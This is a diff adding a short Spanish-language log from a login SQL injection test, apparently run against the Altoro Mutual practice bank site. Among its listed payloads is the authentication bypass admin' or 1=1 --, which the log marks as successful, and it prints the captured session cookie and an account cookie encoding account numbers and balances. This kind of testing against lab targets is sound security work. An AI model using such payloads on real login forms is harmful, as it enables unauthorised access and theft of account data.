@@ -1,0 +1,6 @@
+***** Login SQL Injection Test *****
+[*] uid=admin, Se recibió un 302, pero no se encontró la cookie AltoroAccounts. 
+[*] uid=''+--, Se recibió un 302, pero no se encontró la cookie AltoroAccounts. 
+[!] uid=admin'+or+1=1+--,Se detectó inyección SQL en el login. 
+	 Set-Cookie recibida: JSESSIONID=E43616BF3CC05F8FEF4B0BBAA863B5E3; Path=/; HttpOnly, AltoroAccounts=ODAwMDAwfkNvcnBvcmF0ZX41LjIzOTQ3ODM2MUU3fDgwMDAwMX5DaGVja2luZ345MzgyMC40NHw4MDAwMDJ+U2F2aW5nc34xMDAwMC40Mnw4MDAwMDN+Q2hlY2tpbmd+MTUwMDAuMzl8ODAwMDA0flNhdmluZ3N+MTAuMHw4MDAwMDV+Q2hlY2tpbmd+MjUuMHw4MDAwMDZ+U2F2aW5nc341OTEwMi4wfDgwMDAwN35DaGVja2luZ34xNTAuMHw0NTM5MDgyMDM5Mzk2Mjg4fkNyZWRpdCBDYXJkfjEwMC40Mnw0NDg1OTgzMzU2MjQyMjE3fkNyZWRpdCBDYXJkfjEwMDAwLjk3fA== 
+
